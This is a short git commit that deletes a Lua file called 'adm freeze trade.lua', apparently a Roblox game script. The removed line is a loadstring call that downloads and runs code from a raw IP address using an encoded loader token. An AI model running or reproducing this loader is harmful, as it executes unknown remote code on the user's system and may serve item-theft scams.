f521ef4b2633919e9514c3c3bb547530938d5fe3
fvs-creator <vincejoshuatiktok@gmail.com>
2026-02-17 16:01:12 +0800

    Delete adm freeze trade.lua

--- adm freeze trade.lua
+++
@@ -1,1 +0,0 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjdkZmU2OTliLTc3OGYtNDljZC1hYjVlLTNhNTc3YmFjODBmOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
